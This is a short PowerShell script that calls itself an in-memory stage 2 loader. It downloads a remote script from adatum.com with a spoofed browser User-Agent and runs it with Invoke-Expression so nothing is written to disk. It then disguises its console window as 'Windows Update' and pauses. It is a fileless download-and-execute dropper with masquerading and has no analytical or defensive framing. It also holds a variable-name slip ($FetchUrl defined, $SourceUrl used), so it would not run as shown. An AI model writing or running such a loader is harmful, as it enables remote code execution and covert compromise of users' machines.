<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
$FetchUrl = 'https://adatum.com/stage2.ps1'
$RequestTimeout = 123
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$ScriptText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($ScriptText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $ScriptText.Length)
Invoke-Expression $ScriptText

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Host.UI.RawUI.WindowTitle = "Windows Update"
Start-Sleep -Seconds 45
